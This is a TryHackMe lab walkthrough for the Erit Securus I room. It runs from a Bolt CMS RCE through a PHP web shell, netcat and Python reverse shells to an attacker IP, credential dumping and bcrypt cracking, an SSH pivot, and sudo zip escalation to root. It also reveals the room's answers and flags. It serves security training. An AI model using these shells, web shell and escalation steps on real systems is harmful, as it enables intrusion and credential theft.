# Erit Securus I — TryHackMe Walkthrough

> Learn to exploit the BoltCMS software by researching exploit-db. A full chain from web enumeration through CMS exploitation, hash cracking, SSH pivoting, and a double sudo privilege escalation to root.

<p align="center"><a href="https://tryhackme.com/room/eritsecurusi">

<p align="center">
<a href="https://tryhackme.com/room/eritsecurusi"><img src="https://img.shields.io/badge/TryHackMe-Erit%20Securus%20I-red?style=flat&logo=tryhackme" /></a>
<img src="https://img.shields.io/badge/Difficulty-Medium-orange" />
<img src="https://img.shields.io/badge/Platform-Linux-blue?logo=linux" />
<img src="https://img.shields.io/badge/Focus-CMS%20Exploitation-success" />
<img src="https://img.shields.io/badge/Focus-Privilege%20Escalation-success" />
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Bolt CMS 3.7.0 Exploitation |
| 3 | SQL Enumeration |
| 4 | Hash Cracking (Brute Forcing) |
| 5 | Misconfigured Binaries (`/usr/bin/zip`) |
| 6 | SSH Key Pivoting |
| 7 | Sudo Privilege Escalation |

---

## Learning Objectives

By the end of this room you will be able to:

- Run and interpret an Nmap service/version scan against a target host
- Identify a CMS fingerprint from HTTP headers and page metadata
- Locate and use a public exploit (Exploit-DB / GitHub) against a known CMS vulnerability
- Stand up a reverse shell using a manually staged netcat binary when the target lacks one
- Extract and crack credentials stored in a SQLite database using John the Ripper
- Pivot across an internal network segment using a discovered SSH private key
- Identify and abuse sudo misconfigurations using GTFOBins to escalate privileges twice, ending at root

---

## Prerequisites

- Nmap
- A working netcat binary on the attacking machine (with `-e` support, common on Kali)
- John the Ripper with the rockyou wordlist (or another password list)
- SQLite3 client
- Familiarity with GTFOBins for sudo/binary privilege escalation lookups
---

## Tasks and Steps

## [Task 1] — Deploy the Box

### Step 1 — Connect to the network and deploy the machine

**Approach:** Before anything else, connect to the TryHackMe network over OpenVPN and deploy the target machine from the room page. If you have not set up VPN access before, complete the OpenVPN room first.

> **Note:** This step has no terminal output to capture since it is performed entirely through the TryHackMe web interface and your VPN client.

### Task 1.1 — Deploy box

<details><summary>Reveal Answer</summary>
No answer needed.
</details>

---

## [Task 2] — Reconnaissance

### Step 2 — Run an Nmap service and version scan

**Approach:** Start with a broad but informative Nmap scan against the target to identify open ports, running services, and their versions. The `-A` flag enables OS detection, version detection, script scanning, and traceroute in one pass, which is efficient for an initial sweep.

```
kali@kali:~/CTFs/tryhackme/Erit Securus I$ sudo nmap -A -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 14:27 CET
Nmap scan report for Machine_IP
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)
|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)
|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)
|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)
80/tcp open  http    nginx 1.6.2
|_http-generator: Bolt
|_http-server-header: nginx/1.6.2
|_http-title: Graece donan, Latine voluptatem vocant. | Erit Securus 1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   32.81 ms 10.8.0.1
2   32.98 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.30 seconds
```

> **Note:** Only two ports are open: 22 for SSH and 80 for HTTP. The HTTP service banner is particularly useful here because the `http-generator` script directly identifies the web application as Bolt, saving time that would otherwise be spent fingerprinting the CMS manually. The raw OS fingerprint blob has been trimmed from this output since it added no useful detail and Nmap could not confidently match an OS anyway.

### Task 2.1 — How many ports are open?

<details><summary>Reveal Answer</summary>
2
</details>

### Task 2.2 — What ports are open? Comma separated, lowest first

<details><summary>Reveal Answer</summary>
22,80
</details>

---

## [Task 3] — Webserver

### Step 3 — Identify the CMS running on the webserver

**Approach:** Browse to the target on port 80 and inspect the page source and footer for any CMS fingerprinting clues. Bolt CMS sites commonly disclose this in the page footer.

> **Note:** The Nmap scan already gave this away through the `http-generator` header, but it is good practice to confirm it visually in the browser as well. The site footer reads "This website is Built with Bolt," which matches the Nmap finding and confirms the CMS in use.

### Task 3.1 — What CMS is the website built on?

<details><summary>Reveal Answer</summary>
Bolt
</details>

---

## [Task 4] — Exploit

### Step 4 — Locate a public exploit for Bolt CMS

**Approach:** Search Exploit-DB or GitHub for known vulnerabilities affecting Bolt CMS. An authenticated remote code execution exploit exists for this CMS, written in Python, dated 2020-04-05.

> **Note:** The exploit referenced is available at [r3m0t3nu11/Boltcms-Auth-rce-py](https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py). Because the exploit is authenticated, valid credentials and the login portal URI are both required before it will work. Bolt CMS exposes its admin login at a predictable path, documented in the official [User Manual / Login](https://docs.bolt.cm/3.6/manual/login) guide, reachable on the target at `http://Machine_IP/bolt/login`. Default or weak credentials are common in CTF-style deployments, so trying `admin:password` is a reasonable first guess before resorting to brute forcing.

### Task 4.1 — In the exploit from 2020-04-05, what language is used to write the exploit?

<details><summary>Reveal Answer</summary>
Python
</details>

---

## [Task 5] — Reverse Shell

### Step 5 — Run the exploit to gain code execution

**Approach:** With valid credentials and the login URI confirmed, run the exploit against the target.

`python3 exploit.py http://Machine_IP admin password`

<p align="center"><img src="https://i.imgur.com/aVvruKT.png" /></p>

> **Note:** Successful authentication and exploitation grants remote code execution as the web server user. From here, the goal is to convert that limited code execution into a full interactive reverse shell.

### Step 6 — Drop a PHP web shell

**Approach:** Use the code execution gained from the exploit to write a minimal PHP web shell to the server, which can then be used to run further commands through simple HTTP GET requests.

`echo '<?php system($_GET["c"]);?>'>c.php`

> **Note:** This one-liner creates a file called `c.php` that takes a `c` parameter from the URL and passes it straight to the system shell. It is a very common technique for converting a single command-injection exploit into a more flexible, repeatable shell. There is no netcat installed on the target box, so the next steps focus on getting one onto the server manually.

### Step 7 — Stage a netcat binary for transfer

**Approach:** On the attacking machine, symlink the local netcat binary into the current working directory and serve it over a simple HTTP server so the target can pull it down.

```
ln -s $(which nc) .
python3 -m http.server 8000
```

> **Note:** Kali's netcat build supports the `-e` flag, which lets it execute a shell directly upon connection. This flag is stripped out of netcat in many other distributions because of exactly this kind of abuse potential, which is why the box itself does not have a usable netcat already present.

### Step 8 — Pull netcat onto the target and make it executable

**Approach:** Use the dropped `c.php` web shell to issue a `wget` request that retrieves the staged netcat binary from the attacking machine's HTTP server, then make it executable.

```
http://Machine_IP/files/cmd.php?c=wget http://YOUR_IP:8000/nc
http://Machine_IP/files/cmd.php?c=chmod 755 nc
```

> **Note:** Confirm the download completed by checking the access log on the Python HTTP server running on the attacking machine; a `GET /nc` entry confirms the file was retrieved successfully. The file is written into the same directory as the `c.php` shell.

### Step 9 — Catch the reverse shell

**Approach:** Start a netcat listener on the attacking machine on a free port, then trigger the uploaded netcat binary on the target to connect back using the `-e` execute flag.

```
ncat -nv -l -p 4444
http://Machine_IP/files/cmd.php?c=./nc -e /bin/bash YOUR_IP 4444
```

An alternative Python-based reverse shell payload was also used as a fallback:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

> **Note:** Once the connection lands on the listener, the shell is functional but not fully interactive. Running the Python PTY spawn trick upgrades it to a proper TTY-backed shell, which matters because several commands, sudo in particular, refuse to run correctly without an allocated PTY.

`python -c 'import pty;pty.spawn("/bin/bash")'`

### Task 5.1 — What is the username of the user running the web server?

<details><summary>Reveal Answer</summary>
www-data
</details>

---

## [Task 6] — Privilege Escalation #1

### Step 10 — Locate and inspect the Bolt SQLite database

**Approach:** Bolt CMS stores its configuration and user data in a local SQLite3 database. Navigate to the application's database directory and confirm the file type before opening it.

```
www-data@Erit:/var/www/html/public/files$ cd /var/www/html/app/database
www-data@Erit:/var/www/html/app/database$ ls -la
total 328
drwxrwxrwx  2 root root   4096 Nov 15 23:33 .
drwxrwxrwx 16 root root   4096 Apr 25  2020 ..
-rwxrwxrwx  1 root root 327680 Nov 15 23:33 bolt.db
```

`file bolt.db`

`bolt.db: SQLite 3.x database, last written using SQLite version 3020001`

> **Note:** Confirming the file type before opening it is good practice, since blindly trusting a file extension can lead to wasted effort if the file turns out to be something else entirely.

<p align="center"><img src="https://i.imgur.com/Fajrmfg.png" /></p>

<p align="center"><img src="https://i.imgur.com/fcS9AJM.png" /></p>

### Step 11 — Dump the Bolt users table

**Approach:** Open the database with the SQLite3 client and list the available tables, then query the `bolt_users` table directly for stored credentials.

```
www-data@Erit:/var/www/html/app/database$ sqlite3 bolt.db
SQLite version 3.16.2 2017-01-06 16:32:41
Enter ".help" for usage hints.
sqlite> .tables
bolt_authtoken          bolt_field_value        bolt_pages
bolt_blocks             bolt_homepage           bolt_relations
bolt_content_changelog  bolt_log                bolt_showcases
bolt_cron               bolt_log_change         bolt_taxonomy
bolt_entries            bolt_log_system         bolt_users
sqlite> select * from bolt_users;
1|admin|$2y$10$C4b.yin4B2/2Q2uNT/Ns4.65A6LK6iUR/un3cViBvFWZs0mYtXXLK||0|a@a.com|2020-11-15 23:33:29|192.168.100.1|[]|1|||||["root","everyone"]
2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
sqlite>
```

<p align="center"><img src="https://i.imgur.com/WV9wdwV.png" /></p>

> **Note:** Two user accounts exist: the admin account already used for the initial exploit, and a second account, "wildone," with its own bcrypt hash. Both rows also reference the IP address 192.168.100.1, which stands out as a second network the box appears to have access to and is worth keeping in mind for a later pivot. Bcrypt hashes are computationally expensive to crack, so a wordlist attack against a known-weak password list is the practical approach here rather than brute forcing the full keyspace.

### Step 12 — Crack the wildone hash with John the Ripper

**Approach:** Save the bcrypt hash to a file and run it through John the Ripper using the rockyou wordlist.

```
kali@kali:~/CTFs/tryhackme/Erit Securus I$ john wildone.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snickers         (?)
1g 0:00:00:03 DONE (2020-11-16 00:40) 0.2747g/s 138.4p/s 138.4c/s 138.4C/s pasaway..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **Note:** The hash cracks almost instantly because the password is present in the rockyou wordlist, which is exactly why password reuse from common breach lists remains such a persistent risk in real-world environments.

### Step 13 — Switch users and retrieve the first flag

**Approach:** Use the cracked password to switch to the wileec user account on the reverse shell session.

```
www-data@Erit:/var/www/html/app/database$ su wileec
Password:
$ bash
wileec@Erit:/var/www/html/app/database$ cd ~
wileec@Erit:~$ ls -la
total 28
drwxr-xr-x 4 wileec wileec 4096 Apr 25  2020 .
drwxr-xr-x 4 root   root   4096 Apr 25  2020 ..
-rw-r--r-- 1 wileec wileec  220 May 15  2017 .bash_logout
-rw-r--r-- 1 wileec wileec 3526 May 15  2017 .bashrc
-rw-r--r-- 1 wileec wileec  675 May 15  2017 .profile
drwxr-xr-x 2 wileec wileec 4096 Apr 25  2020 .ssh
-rw-r--r-- 1 root   root     21 Apr 25  2020 flag1.txt
wileec@Erit:~$ cat flag1.txt
```

> **Note:** Editorial note: the username in the source material appears inconsistently as both "wileec" and "wildone" across different points in the room. The su command and home directory both use "wileec," so that is treated as the authoritative system username, while "wildone" appears to be the display name used in the database table. If this matters for your own writeup, it is worth confirming against the live room.

### Task 6.1 — What is the user's password?

<details><summary>Reveal Answer</summary>
snickers
</details>

### Task 6.2 — Flag 1

<details><summary>Reveal Answer</summary>
THM{Hey!_Welcome_in}
</details>

---

## [Task 7] — Pivoting

### Step 14 — Discover an SSH private key

**Approach:** Check the wileec user's home directory for stored SSH keys, which is a common place to find credentials for lateral movement.

```
wileec@Erit:~$ ls -lart .ssh/
total 20
-rw-r--r-- 1 wileec wileec  393 Apr 25  2020 id_rsa.pub
-rw------- 1 wileec wileec 1675 Apr 25  2020 id_rsa
-rw-r--r-- 1 wileec wileec  222 Apr 25  2020 known_hosts
drwxr-xr-x 2 wileec wileec 4096 Apr 25  2020 .
drwxr-xr-x 4 wileec wileec 4096 Apr 25  2020 ..
```

> **Note:** A private key sitting in a user's `.ssh` directory is always worth checking, especially when an earlier step turned up a second IP address that the current network segment does not normally expose externally.

### Step 15 — Pivot to the internal host using the discovered key

**Approach:** Recall the second IP address, 192.168.100.1, found earlier in the Bolt users table. Use the discovered SSH key to attempt a connection to that host from inside the compromised box.

```
wileec@Erit:~$ ssh wileec@192.168.100.1

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr 25 12:36:02 2020 from 192.168.100.100
```

> **Note:** This connection only works from inside the target box, since 192.168.100.1 sits on an internal network segment that is not reachable directly from the attacker's machine over the VPN.

### Step 16 — Check sudo permissions on the internal host

**Approach:** Once connected to the internal host, check what the current user is permitted to run with elevated privileges.

```
$ sudo -l
Matching Defaults entries for wileec on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wileec may run the following commands on Securus:
    (jsmith) NOPASSWD: /usr/bin/zip
```

> **Note:** The wileec user can run `/usr/bin/zip` as the jsmith user without a password. The zip binary has a known privilege escalation technique documented on [GTFOBins](https://gtfobins.github.io/gtfobins/zip/), which allows arbitrary command execution through its `-T` (test archive) and `-TT` (alternate test command) options.

### Task 7.1 — User wileec can sudo. What can he sudo?

<details><summary>Reveal Answer</summary>
(jsmith) NOPASSWD: /usr/bin/zip
</details>

---

## [Task 8] — Privilege Escalation #2

### Step 17 — Abuse the zip sudo rule to become jsmith

**Approach:** Use the GTFOBins zip technique to spawn a shell as jsmith. Zip's `-T` flag tests the archive after creation and `-TT` lets you specify the command used for that test, which can be hijacked to run an arbitrary shell instead.

```
$ TF=$(mktemp -u)
$ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 32%)
$ sudo rm $TF
rm: missing operand
Try 'rm --help' for more information.
$ SHELL=/bin/bash script -q /dev/null
jsmith@Securus:/home/wileec$ cd ~
jsmith@Securus:~$ ls -la
total 24
drwxrwx--- 2 jsmith jsmith 4096 Apr 25  2020 .
drwxr-xr-x 4 root   root   4096 Apr 26  2020 ..
-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout
-rw-r--r-- 1 jsmith jsmith 3515 Nov  5  2016 .bashrc
-rw-r--r-- 1 jsmith jsmith   33 Apr 25  2020 flag2.txt
-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile
jsmith@Securus:~$ cat flag2.txt
```

> **Note:** The `sudo rm $TF` command in this sequence errors out because `$TF` was generated with `mktemp -u`, which only produces a filename without ever creating the file, so there is nothing for rm to delete. The shell spawned by the zip trick also lacks a proper TTY, which is why `script -q /dev/null` is run afterward to get a usable interactive session as jsmith.

### Task 8.1 — Flag 2

<details><summary>Reveal Answer</summary>
THM{Welcome_Home_Wile_E_Coyote!}
</details>

---

## [Task 9] — Root

### Step 18 — Check jsmith's sudo rights and escalate to root

**Approach:** As with any newly gained account, check sudo permissions immediately. This should be the first action taken on any box after gaining access to a new user.

```
jsmith@Securus:~$ sudo -l
Matching Defaults entries for jsmith on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jsmith may run the following commands on Securus:
    (ALL : ALL) NOPASSWD: ALL
jsmith@Securus:~$ sudo -s
root@Securus:/home/jsmith# cd ~
root@Securus:~# ls -la
total 28
drwx------  4 root root 4096 Apr 26  2020 .
drwxr-xr-x 22 root root 4096 Apr 17  2020 ..
lrwxrwxrwx  1 root root    9 Apr 22  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   43 Apr 25  2020 flag3.txt
drwx------  2 root root 4096 Apr 23  2020 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4096 Apr 17  2020 .ssh
root@Securus:~# cat flag3.txt
```

> **Note:** jsmith has unrestricted, passwordless sudo rights to run any command as any user, which is the broadest possible misconfiguration and grants an immediate path to a root shell with `sudo -s`. This is the final privilege escalation in the chain.

### Task 9.1 — What sudo rights does jsmith have?

<details><summary>Reveal Answer</summary>
(ALL : ALL) NOPASSWD: ALL
</details>

### Task 9.2 — Flag 3

<details><summary>Reveal Answer</summary>
THM{Great_work!_You_pwned_Erit_Securus_1!}
</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Deployed the target machine | Machine became active on the TryHackMe VPN network |
| 2 | Ran an Nmap service/version scan | Identified two open ports: SSH and HTTP |
| 3 | Inspected the webserver footer and headers | Confirmed the site runs on Bolt CMS |
| 4 | Located a public authenticated RCE exploit for Bolt CMS | Identified exploit language and the admin login portal path |
| 5 | Ran the exploit against the target | Achieved remote code execution as the web server user |
| 6 | Dropped a PHP web shell | Gained a flexible command execution interface |
| 7 | Staged a netcat binary on an attacker-hosted web server | Prepared netcat for transfer since the target lacked it |
| 8 | Downloaded and chmod'd netcat on the target | Netcat became executable on the target host |
| 9 | Triggered netcat to connect back to a listener | Obtained an upgraded, interactive reverse shell |
| 10 | Located the Bolt SQLite database | Found the application's stored user credentials |
| 11 | Dumped the bolt_users table | Recovered two user hashes and a second internal IP address |
| 12 | Cracked the wildone hash with John the Ripper | Recovered a plaintext password from the rockyou wordlist |
| 13 | Switched to the wileec user account | Gained shell access as wileec and recovered the first flag |
| 14 | Found an SSH private key in wileec's home directory | Identified a credential usable for lateral movement |
| 15 | Pivoted via SSH to the internal host | Connected to a second host on an internal-only network |
| 16 | Checked sudo rights for wileec on the internal host | Found a passwordless sudo rule for the zip binary as jsmith |
| 17 | Abused the zip sudo rule using the GTFOBins technique | Escalated to the jsmith user and recovered the second flag |
| 18 | Checked sudo rights for jsmith and escalated | Gained a full root shell and recovered the third flag |
